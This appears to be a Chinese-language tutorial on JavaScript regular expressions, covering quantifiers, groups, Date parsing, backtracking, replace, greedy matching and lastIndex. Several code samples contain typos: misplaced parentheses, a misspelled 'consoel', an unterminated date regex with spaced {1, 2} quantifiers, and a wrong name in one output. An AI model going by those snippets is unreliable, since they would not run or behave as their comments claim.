<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="regexp">/'\d+'/</span>.test(<span class="string">"'123'"</span>));</span><br><span class="line"><span class="comment">// -&gt; true</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="regexp">/'\d+'/</span>).test(<span class="string">"''"</span>);</span><br><span class="line"><span class="comment">// -&gt; false</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="regexp">/'\d*'/</span>.test(<span class="string">"'123'"</span>));</span><br><span class="line"><span class="comment">// -&gt; true</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="regexp">/'\d*'/</span>.test(<span class="string">"''"</span>));</span><br><span class="line"><span class="comment">// -&gt; true</span></span><br></pre></td></tr></table></figure>

<p><code>*</code>有相似的意义，但是也允许模式出现0次。后面跟着*号的元素不会阻止模式匹配，如果找不到合适的文本匹配将会匹配0个实例。</p>
<p>一个<code>?</code>标志模式中的一部分是可选的，意味着要么出现一次要么出现0次。下面的例子中，<code>u</code>字符允许存在，但是当<code>u</code>字符丢失的时候，模式照样匹配。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> neighbor = <span class="regexp">/neighbou?r/</span>;</span><br><span class="line"><span class="built_in">console</span>.log(neighbor.test(<span class="string">"neighbour"</span>));</span><br><span class="line"><span class="comment">// -&gt; true</span></span><br><span class="line"><span class="built_in">console</span>.log(neighbor.test(<span class="string">"neighbor"</span>));</span><br><span class="line"><span class="comment">// -&gt; true</span></span><br></pre></td></tr></table></figure>

<p>为了表明模式应该重复一个精确的次数，使用花括号。在一个元素后面放置一个<code>{4}</code>，需要这个元素刚好出现四次。也可以为出现的次数指定一个范围：<code>{2, 4}</code>意味着元素必须出现至少2次，至多4次。</p>
<p>这是另一个日期时间模式的版本，允许单位数和双位数日，月和小时。也更容易理解。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> dateTime = <span class="regexp">/\d&#123;1, 2&#125;-\d&#123;1, 2&#125;-\d&#123;4&#125; \d&#123;1, 2&#125;:\d&#123;2&#125;;</span></span><br><span class="line"><span class="regexp">console.log(dateTime.test("1-30-2003 8:45));</span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/ -&gt; true</span></span><br></pre></td></tr></table></figure>

<p>当用花括号时，你也可以通过忽略逗号后面的数字来指定开放的范围。如<code>{5,}</code>表示大于等于5次。</p>
<h2 id="子表达式分组"><a href="#子表达式分组" class="headerlink" title="子表达式分组"></a>子表达式分组</h2><p>为了一次性在超过一个元素上使用<code>*</code>或者<code>+</code>操作符，你必须使用括号。就后面的操作符而言，用括号包围的正则表达式的一部分算作单个元素。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> cartoonCrying = <span class="regexp">/boo+(hoo+)/i</span>;</span><br><span class="line"><span class="built_in">console</span>.log(cartoonCrying.test(<span class="string">"Boohoooohoohooo"</span>));</span><br><span class="line"><span class="comment">// -&gt; true</span></span><br></pre></td></tr></table></figure>

<p>第一个和第二个<code>+</code>字符都只对<em>boo</em>和<em>hoo</em>中的第二个<em>o</em>有效。第三个<code>+</code>字符对整个组<code>(hoo+)</code>有效，匹配类似于这个的一个或多个序列。</p>
<p>表达式末尾的i使得这个正则表达式忽略大小写，允许它匹配输入字符串中的大写<em>B</em>，即便是在模式都是小写字母的情况下。</p>
<h2 id="匹配和分组"><a href="#匹配和分组" class="headerlink" title="匹配和分组"></a>匹配和分组</h2><p><code>test</code>方法是最简单的匹配正则表达式的方式。它只告诉你字符串是否匹配正则表达式模式而没有任何其他信息。正则表达式也有一个<code>exec</code>（execute）方法，如果没有匹配发现则返回<code>null</code>，否则返回一个含有匹配信息的对象。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> match = <span class="regexp">/\d+/</span>.exec(<span class="string">"one two 100"</span>);</span><br><span class="line"><span class="built_in">console</span>.log(match);</span><br><span class="line"><span class="comment">// -&gt; ["100"]</span></span><br><span class="line"><span class="built_in">console</span>.log(match.index);</span><br><span class="line"><span class="comment">// -&gt; 8</span></span><br></pre></td></tr></table></figure>
<p>从<code>exec</code>返回的对象有一个<code>index</code>属性，告诉我们成功的匹配在字符串的起始位置。除了那个，对象看起来像（并且实际上就是）一个字符串数组，首元素就是匹配的字符串。在之前的例子中，这就是我们寻找的位串序列。</p>
<p>字符串也有一个<code>match</code>方法非常类似。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">"one two 100"</span>.match(<span class="regexp">/\d+/</span>));</span><br><span class="line"><span class="comment">// -&gt; ["100"]</span></span><br></pre></td></tr></table></figure>

<p>当正则表达式包含括号包围起来成组的子表达式时，匹配这些组的文本也会展示在数组中。整个匹配总是第一个元素。下一个元素是被第一个组（起始括号在表达式中最先出现的那组）匹配的部分，然后是第二组等等。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> quotedText = <span class="regexp">/'([^']*)'/</span>;</span><br><span class="line"><span class="built_in">console</span>.log(quotedText.exec(<span class="string">"she said 'hello'"</span>));</span><br><span class="line"><span class="comment">// -&gt; ["'hello'", "hello"]</span></span><br></pre></td></tr></table></figure>

<p>当一个组根本不匹配时（如后面跟着<code>?</code>），那么它在输出数组中的位置将保存<code>undefined</code>。相似地，当一个组匹配多次的时候，只有最后一次匹配展示在数组中。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="regexp">/bad(ly)?/</span>.exec(<span class="string">"bad"</span>));</span><br><span class="line"><span class="comment">// -&gt; ["bad", undefined]</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="regexp">/(\d)+/</span>.exec(<span class="string">"123"</span>));</span><br><span class="line"><span class="comment">// -&gt; ["123", "3"]</span></span><br></pre></td></tr></table></figure>

<p>分组对提取字符串的一部分特别有用。如果我们不仅是想核实是否一个字符串包含日期还想提取出它然后构建一个代表它的对象，我们可以在数字模式周围包裹括号并且直接从<code>exec</code>的结果中提取出日期。</p>
<p>但是首先我们说点题外话，我们将讨论JS中内建的代表日期和时间的值的方式。</p>
<h2 id="Date类"><a href="#Date类" class="headerlink" title="Date类"></a>Date类</h2><p>JS有一个标准的代表日期的类，或者不如说是时间点。它被叫做<code>Date</code>。如果你简单的用<code>new</code>创造一个日期对象，你可以得到当前的日期和时间。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="keyword">new</span> <span class="built_in">Date</span>());</span><br><span class="line"><span class="comment">// -&gt; Sun Jan 06 2019 17:34:31 GMT+0800 (中国标准时间)</span></span><br></pre></td></tr></table></figure>

<p>你也可以创造一个给定时间的日期对象。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="keyword">new</span> <span class="built_in">Date</span>(<span class="number">2009</span>, <span class="number">11</span>, <span class="number">9</span>));</span><br><span class="line"><span class="comment">// → Wed Dec 09 2009 00:00:00 GMT+0100 (CET)</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">new</span> <span class="built_in">Date</span>(<span class="number">2009</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">59</span>, <span class="number">59</span>, <span class="number">999</span>));</span><br><span class="line"><span class="comment">// → Wed Dec 09 2009 12:59:59 GMT+0100 (CET)</span></span><br></pre></td></tr></table></figure>

<p>JS使用的规范规定月份数字从0开始，然而日子数字从1开始。这令人困惑。小心点。</p>
<p>最后四个参数（小时，分钟，秒和毫秒）可选，并当未被给出时取0。</p>
<p>时间戳以从1970年开始的毫秒数存储。这遵循了Unix time的规范集，大约是在这个时间被发明的。你可以用负数表示1970之前的时间。<code>getTime</code>方法返回这个数字。如你所想的一样它很大。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="keyword">new</span> <span class="built_in">Date</span>(<span class="number">2013</span>, <span class="number">11</span>, <span class="number">19</span>).getTime());</span><br><span class="line"><span class="comment">// → 1387407600000</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">new</span> <span class="built_in">Date</span>(<span class="number">1387407600000</span>));</span><br><span class="line"><span class="comment">// → Thu Dec 19 2013 00:00:00 GMT+0100 (CET)</span></span><br></pre></td></tr></table></figure>
<p>如果只给<code>Date</code>构造器一个参数，那个参数就以毫秒数的意义被对待。你可以得到当前的毫秒数，要么通过创造一个新的<code>Date</code>对象并调用它的<code>getTime</code>方法，要么调用<code>Date.now</code>函数。</p>
<p>日期对象提供如<code>getFullYear</code>,<code>getMonth</code>,<code>getDate</code>,<code>getHours</code>,<code>getMinutes</code>和<code>getSeconds</code>这样的方法来提取日期的某部分。除了<code>getFullYear</code>还有<code>getYear</code>方法，给定年份减去1900的差值，并且大多时候都没什么用。</p>
<p>在感兴趣的表达式部分周围放置括号，我们现在可以从一个字符串创造日期对象。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getDate</span>(<span class="params">string</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> [_, month, day, year] = <span class="regexp">/(\d&#123;1,2&#125;)-(\d&#123;1,2&#125;)-(\d&#123;4&#125;)/</span>.exec(string);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Date</span>(year, month - <span class="number">1</span>, day);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(getDate(<span class="string">"1-30-2003"</span>));</span><br><span class="line"><span class="comment">// → Thu Jan 30 2003 00:00:00 GMT+0100 (CET)</span></span><br></pre></td></tr></table></figure>

<p>下划线绑定被忽略了并且只用于跳过exec返回的数组中的完整的匹配的元素。</p>
<h2 id="单词和字符串边界"><a href="#单词和字符串边界" class="headerlink" title="单词和字符串边界"></a>单词和字符串边界</h2><p>不幸的是，<code>getDate</code>将会开心地从字符串<em>100-1-30000</em>中提取无意义的日期<em>00-1-3000</em>。匹配可能发生在字符串的任意位置，在这个实例中，匹配开始于第二个字符并结束在倒数第二个字符。</p>
<p>如果我们想强制匹配必须横跨整个字符串，我们可以添加<code>^</code>和<code>$</code>标识。插入符号（^）匹配输入字符串的开头，而<code>$</code>符号匹配字符串的末尾。所以<code>/^\d+$/</code>只会匹配完全包含一位或多位数字的字符串，而<code>/^!/</code>匹配任何以感叹号开头的字符串，<code>/x^/</code>不匹配任何字符串（不可能在字符串的起始前面还有一个x）。</p>
<p>如果我们只想确保日期开始和终止于单词边界（word boundary），我们可以使用标识符<code>\b</code>。一个单词边界可以是字符串的开始或者结尾，也可以是字符串中任何一边是单词字符（如\w）另一边是非单词字符的点。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="regexp">/cat/</span>.test(<span class="string">"concatenate"</span>));</span><br><span class="line"><span class="comment">// -&gt; true</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="regexp">/\bcat\b/</span>).test(<span class="string">"concatenate"</span>));</span><br><span class="line"><span class="comment">// -&gt; false</span></span><br></pre></td></tr></table></figure>
<p>注意到一个边界标识符不匹配一个实际的字符。它只是强制正则表达式在某个特定的条件出现的位置时匹配。</p>
<h2 id="选择模式"><a href="#选择模式" class="headerlink" title="选择模式"></a>选择模式</h2><p>假设我们想知道一段文本是否包含一个数字后面跟着单词<em>pig</em>，<em>cow</em>，或者<em>chicken</em>，或者任何它们的复数形式。</p>
<p>我们可以写三个正则表达式并按顺序特使他们，但是还有个更好的方式。管线操作符（|）表示在左边的模式和右边的模式之间做一个选择。所以可以这样写：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> animalCount = <span class="regexp">/\b\d+ (pig|cow|chicken)s?\b/</span>;</span><br><span class="line"><span class="built_in">console</span>.log(animalCount.test(<span class="string">"15 pigs"</span>));</span><br><span class="line"><span class="comment">// -&gt; true</span></span><br><span class="line"><span class="built_in">console</span>.log(animalCount.test(<span class="string">"15 pigchickens"</span>));</span><br><span class="line"><span class="comment">// -&gt; false</span></span><br></pre></td></tr></table></figure>

<p>括号可以被用于限制管线操作符应用的范围，你可以将多个这样的操作紧挨着彼此放置来表达在大于两种可供选择的事物之间的选择。</p>
<h2 id="匹配的机制"><a href="#匹配的机制" class="headerlink" title="匹配的机制"></a>匹配的机制</h2><p>概念上，如果你使用<code>exec</code>或者<code>test</code>，正则表达式引擎首先通过尝试从字符串起始匹配表达式，然后是第二个字符等等，在你的字符串中寻找一个匹配，知道找到了一个匹配或者到达字符串末尾。要么返回第一个匹配或者不能找到任何匹配。</p>
<p>为了做实际的匹配，引擎对待正则表达式的方式有点像一个流程图。这是上个例子中牲畜表达式的图。</p>


<p>如果我们从图的左边到图的右边找到一条路径，我们的正则表达式就会匹配。我们保存字符串中的当前位置，并且每次我们向前穿过一个盒子，我们见擦汗我们当前位置之后的字符串部分是否匹配那个盒子。</p>
<p>所以我们如果从位置4尝试匹配”the 3 pigs”，我们穿越流程图的过程应该像这样：</p>
<ul>
<li>在位置4，有一个单词边界，我们我们可以穿过第一个盒子</li>
<li>依然在位置4，我们发现了一个数字，所以我们也能穿过第二个盒子。</li>
<li>在位置5，一条路径回到了第二个（数字）盒子之前的位置，而另一条向前穿过保存着一个空白字符的盒子。因为这个字符串有一个空白字符，我们走第二条路径。</li>
<li>我们现在到了位置6（pig的起始位置），在图中的第三条分支。我们没有在这里看见<em>cow</em>或者<em>chicken</em>，但是我们看见了<em>pig</em>，所以我们走这个分支。</li>
<li>在位置9，在三路分支之后，一条路径跳过了<em>s</em>盒子并直接到达最终的单词边界，而另一条分支匹配一个<em>s</em>。因为我们这里有一个<em>s</em>字符，而不是单词边界，所以我们走<em>s</em>盒子。</li>
<li>我们现在在位置10（字符串结尾）并且只可以匹配单词边界。字符串结尾可以算作单词边界，所以我们穿过最后一个盒子并成功匹配了这个字符串。</li>
</ul>
<h2 id="回溯"><a href="#回溯" class="headerlink" title="回溯"></a>回溯</h2><p>正则表达式<code>/\b([01]+b|[\da-f]+h|\d+)\b/</code>要么匹配一个二进制数后面跟着b，要么是一个十六进制数后面跟着h，要么是一个十进制数没有后缀。这是对应的图。</p>


<p>当匹配这个表达式时，经常发生这样的情况，即便输入实际上不包含一个二进制数，上面的二进制分支也会进入。当匹配字符串”103”时，只有到了3我们才知道我们进入了错误的分支。这个字符串确实可以匹配这个表达式，只是不是我们当前所在的分支。</p>
<p>所以匹配程序回溯。当进入一个分支时，它记得当前的位置（在这个情况下，在字符串的起始，刚好经过图中的第一个边界盒子）所以如果当前分支不可行可以回溯并且尝试另一个分支。对于字符串”103”，在遇到字符3之后，将会开始尝试十六进制数的分支，因为数字之后没有<em>h</em>，所以匹配会再次失败。所以会尝试十进制分支。这一个匹配了，并且最终报告了一个匹配。</p>
<p>一遇到一个完整的匹配匹配程序就会终止。这意味着如果多个分支可能潜在的匹配字符串，但只有第一个分支（以正则表达式中的分支序为准）会被使用。</p>
<p>回溯也发生在重复操作符如<code>+</code>和<code>*</code>。如果你匹配<code>/^.*x/</code>和”abcxe”，这个<code>.*</code>部分首先尝试消耗整个字符串。引擎然后意识到他需要一个x来匹配模式。因为字符串末尾没有一个x，所以<code>*</code>操作符尝试去掉一个字符匹配。但是匹配程序在<code>abcx</code>之后依然没有发现x，所以继续回溯，将abc与<code>*</code>操作符进行匹配。现在他发现了一个需要的x并且从位置0到4报告了一次成功的匹配。</p>
<p>写一个要做很多回溯的正则表达式是可能的。当一个模式可以以许多不同的方式去匹配一部分输入的时候这个问题就会发生。例如，如果我们写二进制数正则表达式的时候比较迷糊，我们可能意外的写类似于这样的<code>/([01]+)+b/</code>。</p>


<p>如果尝试匹配非常长的01序列并且末尾没有b字符，匹配程序首先经过内循环直到用完所有数字。然后它意识到没有b，所以回溯一个位置。经过一次外循环，并且再次放弃，尝试去再一次回溯内循环。通过这两个循环将继续尝试所有可能的路线。这意味着每一个额外的字符都使工作量翻倍。即便是几十个字符，导致的匹配实际上也需要很长时间。</p>
<h2 id="replace方法"><a href="#replace方法" class="headerlink" title="replace方法"></a>replace方法</h2><p>字符串值有一个<code>replace</code>方法，可被用于替换掉字符串中的一部分。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">"papa"</span>.replace(<span class="string">"p"</span>, <span class="string">"m"</span>));</span><br><span class="line"><span class="comment">// -&gt; mapa</span></span><br></pre></td></tr></table></figure>
<p>第一个参数也可以是一个正则表达式，在这种情况下第一个匹配到正则表达式的部分被替换。当一个<code>g</code>(global)选项被添加到正则表达式时，所有字符串中的匹配都会被替换，而不仅是第一个。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">"Borobudur"</span>.replace(<span class="regexp">/[ou]/</span>, <span class="string">"a"</span>));</span><br><span class="line"><span class="comment">// -&gt; Barobudur</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"Borobudur"</span>.replace(<span class="regexp">/[ou]/g</span>, <span class="string">"a"</span>));</span><br><span class="line"><span class="comment">// -&gt; Barabadar</span></span><br></pre></td></tr></table></figure>
<p>如果替换一个匹配或者替换所有匹配通过<code>replace</code>方法的额外参数或者通过提供一个不同的<code>replaceAll</code>方法来实现可能是更明智的。但是因为某些不幸的原因，这个选择依赖于正则表达式的属性。</p>
<p>使用正则表达式进行<code>replace</code>的真正强大之处在于我们可以在替换字符串中引用匹配到的组。例如，你假设我们有一个包含人名的大的字符串，每一行一个名字，以<em>Lastname, Firstname</em>的格式。如果我们想交换这些名字并移除逗号去得到一个<em>Firstname Lastname</em>这样的格式，我们可以使用如下代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">"Liskov, Barbara\nMcCarthy, John\nWadler, Philip"</span>.replace(<span class="regexp">/(\w+), (\w+)/g</span>, <span class="string">"$2 $1"</span>));</span><br><span class="line"><span class="comment">// -&gt; Barbara Liskov</span></span><br><span class="line"><span class="comment">//    John McCarthy  </span></span><br><span class="line"><span class="comment">//    Philip Walder</span></span><br></pre></td></tr></table></figure>
<p>在替换字符串中的<code>$1</code>和<code>$2</code>引用模式中括号括起来的组。<code>$1</code>被匹配到第一组的文本替换，<code>$2</code>被匹配到第二组的替换，依此类推，直到<code>$9</code>。整个匹配可以通过<code>$&amp;</code>引用。</p>
<p>可以将函数作为<code>replace</code>的第二个参数传递进来。对于每一个替换，函数将会将每个匹配的组（也包括整个匹配）作为参数进行调用，得到的返回值被插入到新的字符串。这是一个小例子。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> s = <span class="string">"the cia and fbi"</span>;</span><br><span class="line"><span class="built_in">console</span>.log(s.replace(<span class="regexp">/\b(cia|fbi)\b/g</span>, str =&gt; str.toUpperCase()));</span><br><span class="line"><span class="comment">// -&gt; the CIA and FBI</span></span><br></pre></td></tr></table></figure>
<p>这个更有趣：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> stock = <span class="string">"1 lemon, 2 cabbages, and 101 eggs"</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">minusOne</span>(<span class="params">match, amount, unit</span>) </span>&#123;</span><br><span class="line">    amount = <span class="built_in">Number</span>(amount) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(amount == <span class="number">1</span>) &#123; <span class="comment">// only one left, remove ths 's'</span></span><br><span class="line">        unit = unit.slice(<span class="number">0</span>, unit.length - <span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(amount == <span class="number">0</span>) &#123;</span><br><span class="line">        amount = <span class="string">"no"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> amount + <span class="string">" "</span> + unit;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(stock.replace(<span class="regexp">/(\d+) (\w+)/g</span>, minusOne));</span><br><span class="line"><span class="comment">// -&gt; no lemon, 1 cabbage, and 100 eggs</span></span><br></pre></td></tr></table></figure>
<p>这里创造了一个字符串，寻找所有数字后面跟着字母数字的单词的出现，并返回一个字符串，其中每个出现都减1。</p>
<p>这个<code>(\d+)</code>组最终作为函数的<code>amount</code>参数，<code>(\w+)</code>组绑定到<code>unit</code>上。函数将<code>amount</code>转换为数字，因为它匹配<code>\d+</code>所以总是可行的。并且做一些调整以防只有0或者1剩下。</p>
<h2 id="贪婪"><a href="#贪婪" class="headerlink" title="贪婪"></a>贪婪</h2><p>使用<code>replace</code>写一个函数从JS中移除所有的注释是可能的。这是第一个尝试：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">stripComments</span>(<span class="params">code</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> code.replace(<span class="regexp">/\/\/.*|\/\*[^]*\*\//g</span>, <span class="string">""</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(stripComments(<span class="string">"1 + /* 2 */3"</span>));</span><br><span class="line"><span class="comment">// → 1 + 3</span></span><br><span class="line"><span class="built_in">console</span>.log(stripComments(<span class="string">"x = 10;// ten!"</span>));</span><br><span class="line"><span class="comment">// → x = 10;</span></span><br><span class="line"><span class="built_in">console</span>.log(stripComments(<span class="string">"1 /* a */+/* b */ 1"</span>));</span><br><span class="line"><span class="comment">// → 1  1</span></span><br></pre></td></tr></table></figure>

<p>在<code>or</code>操作符之前的部分匹配两个正斜线后面跟着任何非换行字符（.匹配除换行符之外的其他字符）。多行注释的部分有点复杂。我们使用<code>[^]</code>(任何不在字符空集中的字符)作为一种方式去匹配任意字符。因为块级注释可以包含多行，句号不匹配换行符，所以我们不能只用一个<code>.</code>在这。</p>
<p>但是最后一行的输出显然是错误的。为什么？</p>
<p>表达式的<code>[^]*</code>部分，如同我在回溯部分描述的那样，将首先尽可能多的匹配。如果导致了模式后面的部分匹配失败，匹配程序才会回退一个字符并从那里再次尝试。在这个例子中，匹配程序首先尝试匹配字符串的整个的剩余部分并且从那里回退。在回退了4个字符之后它发现了<code>*/</code>的出现并且匹配了它。这并不是我们想要的结果，我们的目的是匹配单个注释，而不是一直到代码的结尾找到最后一个块级注释的结尾。</p>
<p>由于这种行为，我们说重复操作符（+, *, ?和{}）是贪婪的，意味着它们会尽可能多的匹配然后再进行回溯。如果你在他们之后放置一个问号（+?, *?, ??, {}?）。它们就会成为非贪婪地并尽可能少的匹配，只在剩余的模式不匹配时才会增加匹配的字符。</p>
<p>那就是我们这里想要的。通过让<code>*</code>匹配最少的带我们到<code>*/</code>的字符，我们仅仅消耗了一个块级注释。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">stripComments</span>(<span class="params">code</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> code.replace(<span class="regexp">/\/\/.*|\/\*[^]*?\*\//g</span>, <span class="string">""</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(stripComments(<span class="string">"1 /* a */+/* b */ 1"</span>));</span><br><span class="line"><span class="comment">// -&gt; 1 + 1</span></span><br></pre></td></tr></table></figure>

<p>许多再正则表达式程序中的错误都可以归因为无意地在本该使用非贪婪操作符的时候使用了贪婪操作符。当使用重复操作符的时候，首先考虑非贪婪的变种。</p>
<h2 id="动态创造正则表达式对象"><a href="#动态创造正则表达式对象" class="headerlink" title="动态创造正则表达式对象"></a>动态创造正则表达式对象</h2><p>当你写代码时你可能不知道准确的你要匹配的模式。假设你想要在一段文本中寻找用户的名字并且用下划线字符包围它来使它突出。因为只有在程序实际运行的时候你才知道名字，你就不能使用基于正斜线的记号。</p>
<p>但是你可以构建一个字符串并使用<code>RegExp</code>构造器。这是一个例子：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> name = <span class="string">"harry"</span>;</span><br><span class="line"><span class="keyword">let</span> text = <span class="string">"Harry is a suspicious character."</span>;</span><br><span class="line"><span class="keyword">let</span> regexp = <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">"\\b("</span> + name + <span class="string">")\\b"</span>, <span class="string">"gi"</span>);</span><br><span class="line"><span class="built_in">console</span>.log(text.replace(regexp, <span class="string">"_$1_"</span>));</span><br><span class="line"><span class="comment">// → _Harry_ is a suspicious character.</span></span><br></pre></td></tr></table></figure>

<p>当创建<code>\b</code>边界标识符时，我们不得不使用两个反斜线，因为我们在普通字符串中书写他们而不是在正斜线包裹的正则表达式中。<code>RegExp</code>的第二个参数包含了正则表达式的选项，在刚刚的例子中，”gi”代表全局（global）和大小写不敏感（insensitive）。</p>
<p>但是要是名字是”dea+hl[]rd”呢？这将导致一个荒谬的正则表达式，实际上不会匹配用户的名字。</p>
<p>为了解决这个，我们需要在任何有特殊意义的字符前加上反斜线。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> name = <span class="string">"dea+hl[]rd"</span>;</span><br><span class="line"><span class="keyword">let</span> text = <span class="string">"This dea+hl[]rd guy is super annoying."</span>;</span><br><span class="line"><span class="comment">// 这里为什么只对圆括号的右半边做特殊转义，而中括号和大括号不用？？？？？</span></span><br><span class="line"><span class="keyword">let</span> escaped = name.replace(<span class="regexp">/[\\[/+*?()&#123;|^$]/g</span>, <span class="string">"\\$&amp;"</span>);</span><br><span class="line"><span class="keyword">let</span> regexp = <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">"\\b"</span> + escaped + <span class="string">"\\b"</span>, <span class="string">"gi"</span>);</span><br><span class="line"><span class="built_in">console</span>.log(text.replace(regexp, <span class="string">"_$&amp;_"</span>));</span><br><span class="line"><span class="comment">// -&gt; This _dea+hl[]rd_ guy is super annoying.</span></span><br></pre></td></tr></table></figure>

<h2 id="搜索方法"><a href="#搜索方法" class="headerlink" title="搜索方法"></a>搜索方法</h2><p>字符串的<code>indexOf</code>方法不能够使用正则表达式调用。但是有一个<code>search</code>方法可用于正则表达式。类似<code>indexOf</code>，返回表达式出现的位置，如果没有找到则返回-1。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">"  word"</span>.search(<span class="regexp">/\S/</span>));</span><br><span class="line"><span class="comment">// -&gt; 2</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"    "</span>.search(<span class="regexp">/\S/</span>));</span><br><span class="line"><span class="comment">// -&gt; -1</span></span><br></pre></td></tr></table></figure>

<p>不幸的是，没有办法指示匹配从某偏移位置开始（像<code>indexOf</code>的第二个参数一样）。</p>
<h2 id="lastindex属性"><a href="#lastindex属性" class="headerlink" title="lastindex属性"></a><code>lastindex</code>属性</h2><p><code>exec</code>方法类似地，没有提供一个便捷的从字符串某位置开始查找的方式。但是有一种不太方便的方式。</p>
<p>正则表达式对象具有属性。其中一个就是<code>source</code>属性，指明表达式源自于哪个字符串。另一个属性就是<code>lastIndex</code>，在一些限制条件下，控制下一次匹配开始的位置。</p>
<p>条件就是正则表达式必须开启全局（g）或者粘性（y）选项，并且匹配必须通过<code>exec</code>方法发生。再一次的，要是允许一个额外的参数传递给<code>exec</code>，可能就不那么让人困惑，但是使人困惑就是JS正则表达式接口的一个必要的特性。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> pattern = <span class="regexp">/y/g</span>;</span><br><span class="line"><span class="keyword">let</span> match = pattern.exec(<span class="string">"xyzzy"</span>);</span><br><span class="line"><span class="built_in">console</span>.log(match.index);</span><br><span class="line"><span class="comment">// -&gt; 4</span></span><br><span class="line"><span class="built_in">console</span>.log(pattern.lastIndex);</span><br><span class="line"><span class="comment">// -&gt; 5</span></span><br></pre></td></tr></table></figure>
<p>如果匹配成功，那么对<code>exec</code>的调用自动改变<code>lastIndex</code>属性去指向匹配之后的点。如果没有匹配，那么<code>lastIndex</code>被设置为0，也就是新构建的正则表达式对象中的值。</p>
<p>全局（g）和粘性（y）选项的区别在于：当粘性（sticky）开启时，只有当匹配直接开始于<code>lastIndex</code>匹配才会成功，然而对于全局选项而言，将会向前找到一个匹配可以开始的位置。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> global = <span class="regexp">/abc/g</span>;</span><br><span class="line"><span class="built_in">console</span>.log(global.exec(<span class="string">"xyz abc"</span>));</span><br><span class="line"><span class="comment">// -&gt; ["abc"]</span></span><br><span class="line"><span class="keyword">let</span> sticky = <span class="regexp">/abc/y</span>;</span><br><span class="line"><span class="built_in">console</span>.log(sticky.exec(<span class="string">"xyz abc"</span>));</span><br><span class="line"><span class="comment">// -&gt; null</span></span><br></pre></td></tr></table></figure>

<p>当从多个<code>exec</code>调用中使用一个共享的正则表达式时，这些对<code>lastIndex</code>的自动改变可能导致问题。你的正则表达式可能开始于上次调用遗留下来的位置。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> digit = <span class="regexp">/\d/g</span>;</span><br><span class="line"><span class="built_in">console</span>.log(digit.exec(<span class="string">"here it is: 1"</span>));</span><br><span class="line"><span class="comment">// -&gt; ["1"]</span></span><br><span class="line">consoel.log(digit.exec(<span class="string">"and now: 1"</span>));</span><br><span class="line"><span class="comment">// -&gt; null</span></span><br></pre></td></tr></table></figure>

